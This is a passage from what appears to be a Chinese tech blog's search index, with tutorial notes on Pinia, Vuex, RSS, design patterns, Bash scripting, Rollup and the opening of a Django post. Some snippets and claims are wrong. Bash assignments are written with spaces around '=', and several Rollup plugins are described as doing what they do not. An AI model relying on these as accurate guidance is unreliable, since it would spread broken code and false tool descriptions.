2\r}\rdoublePlusOne(){\r// 在getters中调用其他getters，只需要this访问一下就可以\r// return this.doubleCount + 123\r// 通过箭头函数参数，来动态计算\rreturn (a)=\u0026gt;{\rthis.doubleCount + a\r}\r}\r},\ractions: {\rincrement() {\rthis.count++\r}\r}\r})\rsrc/app.vue（在组件引入useDataStore，并且获取state状态）\nimport { useDataStore } from \u0026quot;./stores/main.js\u0026quot;\rconst store = useDataStore()\rconsole.log(store.count)\r...\r\u0026lt;template\u0026gt;\r\u0026lt;h2\u0026gt;{{ store }}\u0026lt;/h2\u0026gt;\r\u0026lt;h2\u0026gt;{{ store.count }}\u0026lt;/h2\u0026gt;\r\u0026lt;/template\u0026gt;\r使用storeToRefs函数解构状态（storeToRefs解构，可以响应式状态）\nsrc/app.vue\nimport { storeToRefs } from \u0026quot;pinia\u0026quot;\rimport { useDataStore } from \u0026quot;./stores/main.js\u0026quot;\rconst { count , doubleCount , doublePlusOne} = storeToRefs(useDataStore())\r...\r\u0026lt;template\u0026gt;\r\u0026lt;h2\u0026gt;{{ count }}\u0026lt;/h2\u0026gt;\r\u0026lt;h2\u0026gt;{{ doubleCount }}\u0026lt;/h2\u0026gt;\r\u0026lt;h2\u0026gt;{{ doublePlusOne(6) }}\u0026lt;/h2\u0026gt;\r\u0026lt;/template\u0026gt;\r调用其他state的getters（假如在其他地方定义了一个getters，想使用）\naddData(state){\r// 获取另一个通过defineStore创建state的实例\rconst store = useAddStore()\rreturn state.count + store.intData\r}\rActions操作state（同步异步都可以使用Actions）\nexport const useStore = defineStore('main', {\rstate: () =\u0026gt; ({\rcounter: 0,\r}),\ractions: {\rcountPlusOne() {\rthis.counter++\r},\rcountPlus(a) {\rthis.counter += a\r}\r}\r})\rimport { useStore } from \u0026quot;./Test.vue\u0026quot;\rconst Store = useStore()\rStore.countPlusOne()\rStore.countPlus(3)\rStore.counter = 100\rActions创建的钩子，可以在各种事件，生命周期中进行触发\n","permalink":"https://99999.fun/posts/124/","summary":"Pinia是vuejs的轻量级状态管理库，Pinia支持Vue devtools浏览器扩展工具，可扩展，模块化设计，热模块更新，轻量级，支持TypeScript，支持SSR服务器端渲染，支持vue2，vue3\nPinia作者也是vuex核心之一\n安装pinia\nnpm install pinia@next\n或者\nyarn add pinia@next\n导入pinia并且挂载为vue插件(在Vite脚手架下)\nsrc/main.js\nimport { createApp } from 'vue'\rimport App from './App.vue'\rconst app = createApp(App)\rimport { createPinia } from 'pinia'\rapp.use(createPinia())\rapp.mount('#app')\rsrc/stores/main.js（pinia通过defineStore函数来创建state，并且接收一个id来标识state）\nimport { defineStore } from 'pinia'\rexport const useDataStore = defineStore('data', {\rstate: () =\u0026gt; {\rreturn { count: 666 }\r},\r//state: () =\u0026gt; {\r//name: chen\r//},\rgetters:{ // getters计算属性\rdoubleCount(state){\rreturn state.","title":"Pinia---vuejs的轻量级状态管理库"},{"content":"vuex是一个专门为vuejs应用程序的设计的状态管理\n集中式存储管理应用的所有组件的状态\n多组件状态共享，不同的组件改变同一个状态\nvuex知识点：state，getter，mutation，action\n安装vuex\nnpm install vuex \u0026ndash;save\n或者\nyarn add vuex\n导入vuex包\nimport Vuex from \u0026ldquo;vuex\u0026rdquo;\n创建vuex实例\nnew Vuex.store()\n将vuex实例挂载在vue对象上\nindex.js\nVue.use(Vuex)\rconst store = new Vuex.Store({\rstate: {\rcount: 0\r}\r})\rexport default store\rmain.js\nnew Vue({\rstore // 将store对象添加到vue实例上\r})\r可以通过this.$store.state.count获取到状态（官方推荐将获取装态的操作放到computed中）\n使用解构获取状态： import { mapState } from \u0026lsquo;vuex\u0026rsquo; export default { mounted() { console.log(this.count) }, computed: { \u0026hellip;mapState([\u0026lsquo;count\u0026rsquo;]) } }\nGetter\ngetters: {\rgetCount(state) {\rreturn state.count + 1\r}\r}\r...\rexport default {\rmounted() {\rconsole.log(this.$store.state.count)\rconsole.log(this.$store.getters.getCount)\r}\r}\rmapGetters函数解构到计算属性（将store中的getter映射到局部计算属性）\ncomputed: {\r...mapGetters(['getCount'])\r}\r或者起别名(起别名是导入对象{})\ncomputed: {\r...mapGetters({mainData: 'getCount'})\r// this.mainData为this.$store.getters.getCount\r}\rMutation\n在vuex中不能直接修改store的值，而是通过Mutation方法来修改，例如：\nmutations: { // setData(state) { // state.count = 3\r// }\rsetMain(state, intData) { state.count = intData.count\r// 通过传参的方式修改\r}\r}\rApp.vue\nexport default {\rmounted() {\rconsole.log(this.$store.state.count)\rthis.$store.commit('setMain',{count: 123})\rconsole.log(this.$store.state.count)\r},\r}\r注意：Mutation方法内部的函数必须是同步的，是不能处理异步的\n在组件中也是可以使用Mutation解构的（Mutation）\n导入并且解构\nimport { mapMutations } from 'vuex'\rexport default {\rmounted() {\rthis.setMain({ count: 666 });\r},\rmethods: {\r// 通过mapMutations解构到methods里面，其别名也是一样的操作\r...mapMutations(['setMain'])\r},\r}\rActions（异步操作，也支持mapActions解构起别名）\nconst store = new Vuex.Store({\rstate: {\rcount: 0\r},\rmutations: {\rsetMain(state, intData) { state.count = intData.count\r// 通过传参的方式修改\r}\r},\ractions: {\rintData (context, mainData) {\rreturn new Promise(resolve =\u0026gt; {\rsetTimeout(() =\u0026gt; {\rcontext.commit('setMain', {count: mainData:count})\rresolve()\r},3000)\r})\r}\r}\r})\rApp.vue\nasync mounted() {\rconsole.log(this.$store.state.count)\rawait this.$store.dispatch('intData',{count: 123})\rconsole.log(this.$store.state.count)\r}\r推荐使用pinia来代替vuex，pinia对ts的支持程度更好，更轻量 https://github.com/vuejs/pinia\n","permalink":"https://99999.fun/posts/123/","summary":"vuex是一个专门为vuejs应用程序的设计的状态管理\n集中式存储管理应用的所有组件的状态\n多组件状态共享，不同的组件改变同一个状态\nvuex知识点：state，getter，mutation，action\n安装vuex\nnpm install vuex \u0026ndash;save\n或者\nyarn add vuex\n导入vuex包\nimport Vuex from \u0026ldquo;vuex\u0026rdquo;\n创建vuex实例\nnew Vuex.store()\n将vuex实例挂载在vue对象上\nindex.js\nVue.use(Vuex)\rconst store = new Vuex.Store({\rstate: {\rcount: 0\r}\r})\rexport default store\rmain.js\nnew Vue({\rstore // 将store对象添加到vue实例上\r})\r可以通过this.$store.state.count获取到状态（官方推荐将获取装态的操作放到computed中）\n使用解构获取状态： import { mapState } from \u0026lsquo;vuex\u0026rsquo; export default { mounted() { console.log(this.count) }, computed: { \u0026hellip;mapState([\u0026lsquo;count\u0026rsquo;]) } }\nGetter\ngetters: {\rgetCount(state) {\rreturn state.","title":"简单使用vuex状态管理库"},{"content":"RSS指 Really Simple Syndication（简易信息聚合），RSS定义了方法来获取网站的标题以及内容，而且RSS可以被自动更新，RSS使用了XML进行编写（xml笔记：https://xiaochenabc123.test.com/archives/17.html）\n一个RSS例子：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; ?\u0026gt;\r\u0026lt;rss version=\u0026quot;2.0\u0026quot;\u0026gt;\r\u0026lt;channel\u0026gt;\r\u0026lt;title\u0026gt;小陈的辣鸡屋\u0026lt;/title\u0026gt;\r\u0026lt;link\u0026gt;https://xiaochenabc123.test.com/\u0026lt;/link\u0026gt;\r\u0026lt;description\u0026gt;xiaochenabc123.test.com\u0026lt;/description\u0026gt;\r\u0026lt;item\u0026gt;\r\u0026lt;title\u0026gt;简单了解设计模式\u0026lt;/title\u0026gt;\r\u0026lt;link\u0026gt;https://xiaochenabc123.test.com/archives/121.html\u0026lt;/link\u0026gt;\r\u0026lt;description\u0026gt;\u0026lt;![CDATA[设计模式实质就是一套可以通用，复用的设计方案，设计模式是针对面向对象的，在面向对象出来之前，程序是面向过程的，设计模式就是软件设计的工具面向过程：逻辑化过程，以逻辑实现面向对象：思考有哪些对象，...]]\u0026gt;\u0026lt;/description\u0026gt;\r\u0026lt;content:encoded xml:lang=\u0026quot;zh-CN\u0026quot;\u0026gt;xxxxxxx\u0026lt;/content:encoded\u0026gt;\r\u0026lt;/item\u0026gt;\r\u0026lt;/channel\u0026gt;\r\u0026lt;/rss\u0026gt;\r可以看到是RSS频道的标题，是该频道的超链接，是该频道的描述，是定义该频道的某篇文章的，其中又有，分别表示文章标题，文章的超链接，文章的描述，其中还有表示文章的内容\nRSS注释和HTML的注释一样，\n注意：RSS是基于XML编写，所以全部元素都要有闭合标签，大小写敏感，属性值要带引号\nchannel元素除了上面那几个外，还有，， ，等等\n元素还有，，，等等\nRSS阅读器可以更好读取RSSfeed\n","permalink":"https://99999.fun/posts/122/","summary":"RSS指 Really Simple Syndication（简易信息聚合），RSS定义了方法来获取网站的标题以及内容，而且RSS可以被自动更新，RSS使用了XML进行编写（xml笔记：https://xiaochenabc123.test.com/archives/17.html）\n一个RSS例子：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; ?\u0026gt;\r\u0026lt;rss version=\u0026quot;2.0\u0026quot;\u0026gt;\r\u0026lt;channel\u0026gt;\r\u0026lt;title\u0026gt;小陈的辣鸡屋\u0026lt;/title\u0026gt;\r\u0026lt;link\u0026gt;https://xiaochenabc123.test.com/\u0026lt;/link\u0026gt;\r\u0026lt;description\u0026gt;xiaochenabc123.test.com\u0026lt;/description\u0026gt;\r\u0026lt;item\u0026gt;\r\u0026lt;title\u0026gt;简单了解设计模式\u0026lt;/title\u0026gt;\r\u0026lt;link\u0026gt;https://xiaochenabc123.test.com/archives/121.html\u0026lt;/link\u0026gt;\r\u0026lt;description\u0026gt;\u0026lt;![CDATA[设计模式实质就是一套可以通用，复用的设计方案，设计模式是针对面向对象的，在面向对象出来之前，程序是面向过程的，设计模式就是软件设计的工具面向过程：逻辑化过程，以逻辑实现面向对象：思考有哪些对象，...]]\u0026gt;\u0026lt;/description\u0026gt;\r\u0026lt;content:encoded xml:lang=\u0026quot;zh-CN\u0026quot;\u0026gt;xxxxxxx\u0026lt;/content:encoded\u0026gt;\r\u0026lt;/item\u0026gt;\r\u0026lt;/channel\u0026gt;\r\u0026lt;/rss\u0026gt;\r可以看到是RSS频道的标题，是该频道的超链接，是该频道的描述，是定义该频道的某篇文章的，其中又有，分别表示文章标题，文章的超链接，文章的描述，其中还有表示文章的内容\nRSS注释和HTML的注释一样，\n注意：RSS是基于XML编写，所以全部元素都要有闭合标签，大小写敏感，属性值要带引号\nchannel元素除了上面那几个外，还有，， ，等等\n元素还有，，，等等\nRSS阅读器可以更好读取RSSfeed","title":"简单了解RSS"},{"content":"设计模式实质就是一套可以通用，复用的设计方案，设计模式是针对面向对象的，在面向对象出来之前，程序是面向过程的，设计模式就是软件设计的工具\n面向过程：逻辑化过程，以逻辑实现\n面向对象：思考有哪些对象，对象都有什么行为，行为的逻辑化\n设计模式的好处就是通用可复用，跨语言\n设计模式的6大原则：\n单一职责原则：指的是一个类只负责一个职责，职责越单一，越容易复用\n里氏替换原则：子类可以替换自己的父类，通过开闭原则，通过增加子类来实现父类的“修改”，子类可以添加自己的方法和属性，但是不能重写父类的方法\n依赖倒置原则：依赖于接口，而不是实现，面向接口编程，类于类之间不要存在直接依赖，而依赖于接口\n接口隔离原则：不同的功能应该用多种接口实现行为，而不能将接口功能直接概括全部行为，单独实现需要的接口\n迪米特法则：迪米特法则又叫最少知识原则，一个对象对其他对象应该保持最少的了解，降低类与类之间的耦合，避免一个类依赖于另一个类，而导致另一个类的影响\n开闭原则：指的是对扩展进行开放，对修改进行关闭，需要添加新功能，应该添加类，而不是修改原来有的类，保证程序的稳定性\n常见的设计模式有工厂模式，策略模式，单例模式，代理模式，适配器模式，装饰者模式，模版方法模式，观察者模式，抽象工厂模式，门面模式\n创建型模式：对象实例化的模式，创建型模式用于解耦对象的实例化过程 单例模式 工厂模式 抽象工厂 建造者模式 原型模式\n创建型模式就是指创建对象，在创建对象时通过共同的接口来指向这个新创建的对象\n结构型模式：把类或对象结合在一起形成一个更大的结构 适配器模式 组合模式 装饰器模式 代理模式 享元模式 外观模式 桥接模式\n行为型模式：类和对象如何交互，及划分责任和算法 迭代器模式 模板方法模式 策略模式 命令模式 状态模式 责任链模式 备忘录模式 观察者模式 访问者模式 中介者模式 解释器模式\n","permalink":"https://99999.fun/posts/121/","summary":"设计模式实质就是一套可以通用，复用的设计方案，设计模式是针对面向对象的，在面向对象出来之前，程序是面向过程的，设计模式就是软件设计的工具\n面向过程：逻辑化过程，以逻辑实现\n面向对象：思考有哪些对象，对象都有什么行为，行为的逻辑化\n设计模式的好处就是通用可复用，跨语言\n设计模式的6大原则：\n单一职责原则：指的是一个类只负责一个职责，职责越单一，越容易复用\n里氏替换原则：子类可以替换自己的父类，通过开闭原则，通过增加子类来实现父类的“修改”，子类可以添加自己的方法和属性，但是不能重写父类的方法\n依赖倒置原则：依赖于接口，而不是实现，面向接口编程，类于类之间不要存在直接依赖，而依赖于接口\n接口隔离原则：不同的功能应该用多种接口实现行为，而不能将接口功能直接概括全部行为，单独实现需要的接口\n迪米特法则：迪米特法则又叫最少知识原则，一个对象对其他对象应该保持最少的了解，降低类与类之间的耦合，避免一个类依赖于另一个类，而导致另一个类的影响\n开闭原则：指的是对扩展进行开放，对修改进行关闭，需要添加新功能，应该添加类，而不是修改原来有的类，保证程序的稳定性\n常见的设计模式有工厂模式，策略模式，单例模式，代理模式，适配器模式，装饰者模式，模版方法模式，观察者模式，抽象工厂模式，门面模式\n创建型模式：对象实例化的模式，创建型模式用于解耦对象的实例化过程 单例模式 工厂模式 抽象工厂 建造者模式 原型模式\n创建型模式就是指创建对象，在创建对象时通过共同的接口来指向这个新创建的对象\n结构型模式：把类或对象结合在一起形成一个更大的结构 适配器模式 组合模式 装饰器模式 代理模式 享元模式 外观模式 桥接模式\n行为型模式：类和对象如何交互，及划分责任和算法 迭代器模式 模板方法模式 策略模式 命令模式 状态模式 责任链模式 备忘录模式 观察者模式 访问者模式 中介者模式 解释器模式","title":"简单了解设计模式"},{"content":"shell中文意思为壳，shell可以接受使用者的指令，来调用服务，shell的种类很多，而比较常见是Bash，头部声明#!/bin/bash，表示bash是解释脚本的程序\n例如：\n#!/bin/bash\recho \u0026quot;hallo word\u0026quot;\r执行该脚本（注意：需要有可执行权限，sudo chmod +x hallo.sh）\nbash hallo.sh\n也可以直接执行\n./hallo.sh\n变量（首字符必须是字母，而且不能有bash的关键字，大小写敏感）\ndata = \u0026ldquo;hallo\u0026rdquo; echo $data data = \u0026ldquo;word\u0026rdquo; echo ${data}\n注意：如果使用单引号，单引号里面有变量的话，是无法生效的，而且还不能出现单引号，而且双引号可以使用变量和转义字符，美元符号（$）只有在使用变量才需要，在定义，更新，删除变量都不需要\n例如：\nname=\u0026ldquo;chenjunlin\u0026rdquo; data=\u0026ldquo;hallo, ${name} !\u0026rdquo; echo $data\n获取字符串的长度\ndata=\u0026ldquo;hallo word\u0026rdquo; echo ${#data}\n获取指定位置的字符 data=\u0026ldquo;hallo word\u0026rdquo; echo ${#data:5:8}\n删除变量（不能删除只读变量）\nunset data echo ${data}\n在shell脚本定义的变量只能在当前脚本交互中使用，可以通过export传递变量到子shell中，可以通过env或者export指令来获取当前shell的环境变量\n参数\necho \u0026ldquo;hallo word\u0026rdquo;; echo \u0026ldquo;要执行的shell脚本：$0\u0026rdquo;; echo \u0026ldquo;参数为：$1\u0026rdquo;;\n./hallo.sh abc\n获取参数的个数：$#\n以单一字符串的方式输出全部参数（要被双引号包裹）：$*\n以独立字符串的方式输出全部参数（要被双引号包裹）：$@\n获取上个命令的状态（是否执行成功，0为成功，非0为失败）：$?\n获取当前脚本shell进程的ID：$$\n获取后台运行的最后一个进程的ID：$!\n配合函数使用（参数也可以通过函数来传递）\nfunction abc(){\recho \u0026quot;参数1: $1\u0026quot;\recho \u0026quot;被执行的脚本为: $0\u0026quot;\r}\rabc hallo\r./hallo.sh\n参数1: hallo 被执行的脚本为: hallo.sh\n数组（不需要逗号分开，使用的是空格）\ndata = (1 2 3 4 5 \u0026ldquo;hallo word\u0026rdquo;) data[6] = \u0026ldquo;shell 666\u0026rdquo; echo \u0026ldquo;${data[6]}\u0026rdquo;\n获取数组的长度\n${#data[*]}或者${#data[@]}\u0026quot;\n删除数组或者元素（如果不带索引则删除全部元素）\nunset data[5]\n数组切片\necho \u0026ldquo;${data[@]:2:4}\u0026rdquo;\n数组元素更新\necho \u0026ldquo;${data[@]/2/100}\u0026rdquo;\n数学运算（bash并不支持运算，需要利用第三方工具）\nabc = 123 xyz =666 let data = ${abc} + ${xyz} echo $data\n或者\ndata = `expr $abc + $xyz` echo $data\ndata = $[$abc + $xyz] echo $data\ndata = $(($abc + $xyz)) echo $data\n注意：shell的关系运算符不支持字符串，只支持数字\n判断是否相等：-eq 判断是否不相等：-ne 判断是否大于：-gt 判断是否小于：-lt 判断是否相等或者大于：-ge 判断是否相等或者小于：-le\n例如：\nabc = 123\rxyz =666\rif [ $abc -eq $xyz ]\rthen\recho\u0026quot;相等\u0026quot;\relse\recho\u0026quot;不相等\u0026quot;\rfi\rif [ $abc -gt $xyz ]\rthen\recho\u0026quot;大于\u0026quot;\relse\recho\u0026quot;不大于\u0026quot;\r布尔运算符\n\u0026amp;\u0026amp;和||\n或：-o\n与：-a\n非：!\n例如：\nabc = 123\rxyz = 666\rif [ $abc -eq $xyz -o $abc -lt $xyz]\rthen\recho\u0026quot;相等或者小于\u0026quot;\relse\recho\u0026quot;不相等或者小于\u0026quot;\rfi\r字符串运算符\nabc = \u0026quot;hallo\u0026quot;\rxyz = \u0026quot;hi\u0026quot;\rif [$abc = $xyz];then\recho\u0026quot;相等\u0026quot;\relse\recho\u0026quot;不相等\u0026quot;\r判断字符串长度是否为0：-z（为0返回true） 判断字符串长度是否不为0：-n（不为0返回true） 判断字符串是否不为空：$（不为空返回true）\n例如：\na = \u0026quot;hallo word\u0026quot;\rb = \u0026quot;abchhh\u0026quot;\rif [ -z $a];then\recho \u0026quot;$a :字符串长度为0\u0026quot;\relse\recho \u0026quot;$a :字符串长度不为0\u0026quot;\rfi\rif [ ${b}];then\recho \u0026quot;$b :字符串不为空\u0026quot;\relse\recho \u0026quot;$b :字符串为空\u0026quot;\rfi\r文件运算符\n检查文件是否为目录（是返回true）：-d 检查文件是否为块设备文件：-b 检查文件是否为字符设备文件：-c 检查文件是否为普通文件（不是目录，也不能设备文件）：-f 检查文件是否可读：-r 检查文件是否可写：-w 检查文件是否可执行：-x 检查文件大小是否大于0（大于返回true）：-s 检查文件（目录）是否存在：-e 检查文件是否设置了SGID位：-g 检查文件是否设置了SUID位：-u 检查文件是否是有名管道：-p 检查文件是否设置粘着位(Sticky Bit)：-k\n例如：\ndata = \u0026quot;/etc/hallo\u0026quot;\rif [-r $data]\rthen\recho \u0026quot;文件可读\u0026quot;\relse\recho \u0026quot;文件不可读\u0026quot;\rfi\rif [-e $data]\rthen\recho \u0026quot;文件存在\u0026quot;\relse\recho \u0026quot;文件不存在\u0026quot;\rfi\recho和printf\necho可以输出普通字符串，转义，变量\n开启转义功能：echo -e \u0026ldquo;hallo!!! \\n\u0026rdquo;\n使用单引号可以原封不动的输出字符串\n将执行结果指向到文件中\necho \u0026ldquo;hallo word\u0026rdquo; \u0026gt; data\nprintf比较高级点，可以定义字符串的对齐方式，宽度等等，而且printf默认不自动添加换行符（echo自动添加），可以手动\\n\nprintf \u0026ldquo;%-8s %-5s %-6.3s\\n\u0026rdquo; root data main 6.12345\n上面这句脚本的%s表示输出字符串（类似的还有$c(整型输出),$d（字符输出）,$f（小数输出））\n%-8s表示一个宽度为8个字符，如果有-表示左对齐，没有就是右对齐，全部字符都被输出到8个字符宽的字符中，如果不足8个字符，则自动以空格填充，超出的话，也会全部显示（不会忽略）\n%-6.3s表示将其格式化为小数，.3表示保留3位小数\ntest命令用来判断条件是否成立，数值，字符，文件都可以判断\ntest命令使用的是关系运算符，例如：\ndata1 = 300\rdata2 = 200\rif test $[data1] -gt $[data2]\rthen\recho \u0026quot;data1大于data2\u0026quot;\relse\recho \u0026quot;data1小于data2\u0026quot;\rfi\rif判断（注意：如果else分支没有语句要执行，就不要写else了）\nif then elif else fi\nfor循环\nfor data in 1 2 3\rdo\recho \u0026quot;data : $data\u0026quot;\rdone\rwhile循环\ndata = 1\rwhile(( $data \u0026lt;= 10))\rdo\recho $data\rlet \u0026quot;data++\u0026quot;\rdone\runtil循环\ndata=1\runtil [ ! $data -lt 10 ]\rdo\recho $data\rdata=`expr $data + 1`\rdone\rcase \u0026hellip; esac语句（替代switch语句）\necho '请输入1到3之间的数字:'\recho '输入的数字为:'\rread data\rcase $data in\r1) echo '1'\r;;\r2) echo '2'\r;;\r3) echo '3'\r;;\r*) echo '没有输入1到3之间的数字'\r;;\resac\r跳出循环\nbreak（终止执行后面的循环，一般搭配判断使用）\ncontinue（只终止当前循环，不会终止执行后面的循环）\n函数\ndemo(){\recho \u0026quot;hallo word\u0026quot;\rreturn $(($1+2))\r}\rdemo 100 300\recho \u0026quot; $? \u0026quot;\r","permalink":"https://99999.fun/posts/120/","summary":"shell中文意思为壳，shell可以接受使用者的指令，来调用服务，shell的种类很多，而比较常见是Bash，头部声明#!/bin/bash，表示bash是解释脚本的程序\n例如：\n#!/bin/bash\recho \u0026quot;hallo word\u0026quot;\r执行该脚本（注意：需要有可执行权限，sudo chmod +x hallo.sh）\nbash hallo.sh\n也可以直接执行\n./hallo.sh\n变量（首字符必须是字母，而且不能有bash的关键字，大小写敏感）\ndata = \u0026ldquo;hallo\u0026rdquo; echo $data data = \u0026ldquo;word\u0026rdquo; echo ${data}\n注意：如果使用单引号，单引号里面有变量的话，是无法生效的，而且还不能出现单引号，而且双引号可以使用变量和转义字符，美元符号（$）只有在使用变量才需要，在定义，更新，删除变量都不需要\n例如：\nname=\u0026ldquo;chenjunlin\u0026rdquo; data=\u0026ldquo;hallo, ${name} !\u0026rdquo; echo $data\n获取字符串的长度\ndata=\u0026ldquo;hallo word\u0026rdquo; echo ${#data}\n获取指定位置的字符 data=\u0026ldquo;hallo word\u0026rdquo; echo ${#data:5:8}\n删除变量（不能删除只读变量）\nunset data echo ${data}\n在shell脚本定义的变量只能在当前脚本交互中使用，可以通过export传递变量到子shell中，可以通过env或者export指令来获取当前shell的环境变量\n参数\necho \u0026ldquo;hallo word\u0026rdquo;; echo \u0026ldquo;要执行的shell脚本：$0\u0026rdquo;; echo \u0026ldquo;参数为：$1\u0026rdquo;;\n./hallo.sh abc\n获取参数的个数：$#\n以单一字符串的方式输出全部参数（要被双引号包裹）：$*\n以独立字符串的方式输出全部参数（要被双引号包裹）：$@\n获取上个命令的状态（是否执行成功，0为成功，非0为失败）：$?\n获取当前脚本shell进程的ID：$$\n获取后台运行的最后一个进程的ID：$!\n配合函数使用（参数也可以通过函数来传递）\nfunction abc(){\recho \u0026quot;参数1: $1\u0026quot;\recho \u0026quot;被执行的脚本为: $0\u0026quot;\r}\rabc hallo\r.","title":"shell脚本学习笔记"},{"content":"根据Rollup官方文档的介绍：Rollup 是一个 JavaScript 模块打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。\nRollup和webpack那种偏向于应用打包不同，Rollup更专注于类库打包，像vue，react都是通过rollup打包的\n注意：webpack支持HMR（热模块更新），而Rollup并不支持，因此在应用打包的时候还是选择webpack比较好，但是如果只是打包类库之类的，并且还是基于ES6模块开发的，那么就可以考虑选择rollup了，因为rollup在Tree-shaking和ES6模块有着算法优势。因为Rollup对模块化是使用新标准，例如 CommonJS，而不是老旧解决方案\n提示：webpack已经支持Tree-shaking，并且在babel-loader的情况下也支持es6 module的打包\nRollup是ESM模块标准构建打包工具，源必须使用ESM模块标准，如果需要使用其他标准可通过插件完成\n安装rollup\nnpm install rollup\n查看帮助文档\nrollup \u0026ndash;help\n打包使用\nrollup -i index.js\r默认输出到终端\n指定输出到哪个文件\nrollup -i index.js --file dist.js\r还可以指定输出模块标准是哪个\nrollup -i index.js --file dist.js --format umd\rrollup -i index.js --file dist.js --format cjs\rrollup -i index.js --file dist.js --format iife\r打包\nrollup src/demo.js -f cjs -o dist/bundle.js\n注意：-f是\u0026ndash;format的缩写，表示生成代码的格式，例如amd，cjs，es，umd，iife\n使用UMD格式需要指明一个name属性，用来挂载模块到全局环境中\nrollup src/demo.js -f umd -o dist/bundle.js \u0026ndash;name hallo\n在global下声明一个名为hallo的对象，用来挂载全部的export模块\n一次打包多个文件\nrollup -i index.js -i main.js \u0026ndash;dir dist \u0026ndash;format cjs\n如果想监听文件是否改动，可以使用-w参数（\u0026ndash;watch），当文件发生改动的时候，重新打包\n配置文件（rollup.config.js）\nexport default {\rinput: [\u0026quot;./src/demo.js\u0026quot;],\routput: {\rfile: \u0026quot;./dist/bundle.js\u0026quot;,\rformat: \u0026quot;cjs\u0026quot;,\rname: \u0026quot;experience\u0026quot;,\r},\r}\r如果配置文件想使用module.exports = {}的方式，需要将配置文件修改为.cjs文件\n执行命令\nrollup -c rollup.config.js\n或者\nrollup \u0026ndash;config rollup.config.js\n打包阶段传递环境变量\nrollup.config.js获取设置的变量 console.log(process.env.DEV)\n执行时设置环境变量 rollup -c rollup.config.js \u0026ndash;environment DEV:1\n这个可以通过环境变量的不同，来做不同的处理，而不需要写多套config配置了\nRollup的Tree-shaking功能，只对使用的模块进行打包，对于没有使用的模块是不进行打包的\nRollup常用插件（vite使用Rollup作为打包工具，因此vite也可以使用Rollup插件）\n@rollup/plugin-json，打包json文件成js代码\n安装\nyarn add @rollup/plugin-json\n使用\nyarn rollup -c rollup.config.js \u0026ndash;plugin json\n如果不想在命令行设置要使用的插件，也可以在rollup.config.js下设置\nimport json form rollup/plugin-json\rexport default {\rinput: [\u0026quot;./src/demo.js\u0026quot;],\routput: {\rfile: \u0026quot;./dist/bundle.js\u0026quot;,\rformat: \u0026quot;cjs\u0026quot;,\rname: \u0026quot;experience\u0026quot;,\rplugins: [],\rbanner: '/**hallo word**/',\r},\rexternals: [\r'react'\r]\rplugins:[\rjson(),\r]\r}\r可以看到Rollup插件是函数，并且是顺序执行插件\nexternals可以指定不打包的模块\nbanner是指定打包完成文件头部的注释，会和rollup-plugin-terser插件冲突，代码压缩会删除全部注释\n也可以通过设置npm script脚本来简化命令\n'scripts':{\r'build': 'rollup -c rollup.config.js'\r}\r执行npm run build或者yarn build都可以执行\n@rollup/plugin-babel，将es6文件转换为es5文件\n@rollup/plugin-alias，设置模块别名，不需要写很长很长的路径，例如：\nplugins: [\ralias({\rentries: [\r{ find: 'main', replacement: '../src/main' },\r{ find: 'test', replacement: './test' }\r]\r})\r]\rindex.js\nimport main from 'main'\rimport test from 'test'\r@rollup/plugin-commonjs，让其支持CommonJS模块标准打包\n@rollup/plugin-vue，打包.vue文件，vue2和vue3使用的插件版本不同，vue3使用的是@rollup/plugin-vue6.0.0版本以上，而vue2使用@rollup/plugin-vue5.1.9版本，而且还需要搭配vue编译器使用，vue3使用@vue/compiler-sfc，vue2使用vue-template-compiler\n@rollup/plugin-node-resolve，允许打包第三方模块，这个插件需要搭配@rollup/plugin-commonjs使用，因为这个插件底层实现是使用了CommonJS模块标准\n@rollup/plugin-typescript，增加typescript支持，TypeScript版本要求3.7以及以上\n@rollup/plugin-image，支持图片加载依赖，图片会被编码为base64格式（体积会增加）\nrollup-plugin-terser，代码压缩插件，应该在打包完成后执行该插件，因此应该在output内部的plugins设置，老插件，这个插件没有设置default，import使用时需要{terser}\n@rollup/plugin-postcss，让其支持使用postcss以及postcss插件\n@rollup/plugin-serve，启动本地服务器\n@rollup/plugin-livereload，文件发生变化，进行实时刷新\n@rollup/plugin-eslint，打包时校验语法是否符合规范\n@rollup/plugin-copy，打包时删除debugger语句和函数，例如console.log\n@rollup/plugin-visualizer，加载WebAssembly模块\n","permalink":"https://99999.fun/posts/119/","summary":"根据Rollup官方文档的介绍：Rollup 是一个 JavaScript 模块打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。\nRollup和webpack那种偏向于应用打包不同，Rollup更专注于类库打包，像vue，react都是通过rollup打包的\n注意：webpack支持HMR（热模块更新），而Rollup并不支持，因此在应用打包的时候还是选择webpack比较好，但是如果只是打包类库之类的，并且还是基于ES6模块开发的，那么就可以考虑选择rollup了，因为rollup在Tree-shaking和ES6模块有着算法优势。因为Rollup对模块化是使用新标准，例如 CommonJS，而不是老旧解决方案\n提示：webpack已经支持Tree-shaking，并且在babel-loader的情况下也支持es6 module的打包\nRollup是ESM模块标准构建打包工具，源必须使用ESM模块标准，如果需要使用其他标准可通过插件完成\n安装rollup\nnpm install rollup\n查看帮助文档\nrollup \u0026ndash;help\n打包使用\nrollup -i index.js\r默认输出到终端\n指定输出到哪个文件\nrollup -i index.js --file dist.js\r还可以指定输出模块标准是哪个\nrollup -i index.js --file dist.js --format umd\rrollup -i index.js --file dist.js --format cjs\rrollup -i index.js --file dist.js --format iife\r打包\nrollup src/demo.js -f cjs -o dist/bundle.js\n注意：-f是\u0026ndash;format的缩写，表示生成代码的格式，例如amd，cjs，es，umd，iife\n使用UMD格式需要指明一个name属性，用来挂载模块到全局环境中\nrollup src/demo.js -f umd -o dist/bundle.js \u0026ndash;name hallo\n在global下声明一个名为hallo的对象，用来挂载全部的export模块","title":"简单使用Rollup模块打包工具"},{"content":"django是一个基于Python编写的Web框架\nDjango采用了MVT的设计模式（模型，视图，模板）（mvt设计模式是基于mvc设计模式的）\n安装django\npip install django\n检查是否安装成功\ndjango-admin\ndjango常用命令\nstartproject #创建django项目\nstartapp #创建django应用\ncheck #检查校验项目完整性\nrunserver #本地运行django项目\nshell # 进入django项目的shell环境（Python）\ntest # 执行django实例测试\nmakemigrations # 创建模型变更的迁移文件\nmigrate # 执行迁移文件\ndumpdata # 数据库数据导出\nloaddata # 文件数据导入数据库\n创建第一个项目\ndjango-admin startproject 